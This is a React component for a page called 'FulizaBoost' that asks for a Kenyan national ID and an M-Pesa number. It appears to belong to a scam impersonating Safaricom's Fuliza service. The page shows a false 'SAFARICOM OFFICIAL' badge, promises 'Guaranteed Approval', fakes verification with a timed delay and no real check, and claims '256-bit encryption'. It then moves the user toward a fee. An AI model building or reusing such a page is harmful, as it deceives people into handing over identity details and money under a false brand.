import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import "../styles/PersonalDetails.css";

const PersonalDetails = () => {
  const navigate = useNavigate();
  const { state } = useLocation();

  // Get dynamic limit & fee from state or sessionStorage
  const [limitData, setLimitData] = useState<{ amount: number; fee: number } | null>(null);

  useEffect(() => {
    if (state && state.amount && state.fee) {
      setLimitData({ amount: state.amount, fee: state.fee });
      sessionStorage.setItem("selectedLimit", JSON.stringify({ amount: state.amount, fee: state.fee }));
    } else {
      // fallback if user reloads the page
      const storedLimit = JSON.parse(sessionStorage.getItem("selectedLimit") || "null");
      if (storedLimit) setLimitData(storedLimit);
    }
  }, [state]);

  const [idNumber, setIdNumber] = useState("");
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);

  // ✅ Simple Kenyan validation
  const isIdValid = /^\d{6,10}$/.test(idNumber);
  const isPhoneValid = /^7\d{8}$/.test(phone);
  const isFormValid = isIdValid && isPhoneValid && !loading && limitData !== null;

  const handleVerify = () => {
    if (!isFormValid || !limitData) return;

    setLoading(true);

    setTimeout(() => {
      setLoading(false);
      navigate("/confirmation", {
        state: {
          limit: limitData.amount,
          fee: limitData.fee,
          phone: `+254${phone}`,
        },
      });
    }, 2000);
  };

  if (!limitData) {
    // Prevent rendering if no limit info
    return <p>Loading...</p>;
  }

  return (
    <main className="pd-container">
      {/* HEADER */}
      <div className="pd-header">
        <button className="back-btn" onClick={() => navigate(-1)}>
          ←
        </button>
        <span className="header-title">Personal Details</span>
      </div>

      {/* BRAND */}
      <div className="pd-brand">
        <div className="badge">● SAFARICOM OFFICIAL</div>
        <h1 className="title">FulizaBoost</h1>
        <p className="subtitle">
          Instant Limit Increase • Guaranteed Approval
        </p>
      </div>

      <hr />

      {/* FORM HEADER */}
      <h2 className="identify-title">Identify Yourself</h2>
      <p className="identify-text">
        This information is required to verify your eligibility for the limit
        increase.
      </p>

      {/* NATIONAL ID */}
      <div className="form-group">
        <label>National ID Number</label>
        <input
          type="text"
          placeholder="Enter ID Number"
          value={idNumber}
          onChange={(e) => setIdNumber(e.target.value)}
        />
        {!isIdValid && idNumber && (
          <span className="error-text">Enter a valid ID number</span>
        )}
      </div>

      {/* PHONE */}
      <div className="form-group">
        <label>M-Pesa Registered Number</label>
        <div className="phone-input">
          <span className="prefix">+254</span>
          <input
            type="text"
            placeholder="7xx xxx xxx"
            value={phone}
            onChange={(e) =>
              setPhone(e.target.value.replace(/\D/g, ""))
            }
          />
        </div>
        {!isPhoneValid && phone && (
          <span className="error-text">
            Enter a valid Safaricom number
          </span>
        )}
      </div>

      {/* FOOTER */}
      <div className="pd-footer">
        <button
          className={`verify-btn ${isFormValid ? "enabled" : ""}`}
          onClick={handleVerify}
        >
          {loading ? <span className="spinner" /> : "Verify & Continue"}
        </button>

        <p className="secure-text">SECURE 256-BIT ENCRYPTION</p>
      </div>
    </main>
  );
};

export default PersonalDetails;
